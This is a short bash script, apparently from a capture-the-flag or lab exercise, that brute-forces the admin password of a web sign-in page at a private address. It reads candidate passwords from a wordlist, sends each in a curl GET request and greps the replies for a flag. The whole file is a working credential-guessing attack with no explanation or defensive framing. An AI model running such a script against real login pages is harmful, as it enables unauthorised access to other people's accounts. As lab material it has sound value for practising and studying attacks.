#!/bin/bash

base_url="http://192.168.1.23/?page=signin&username=admin&password="
end_url="&Login=Login#"

while IFS='' read -r line || [[ -n "$line" ]]; do
	url=$base_url$line$end_url
	echo `curl -X GET $url | grep flag`
done < "$1"
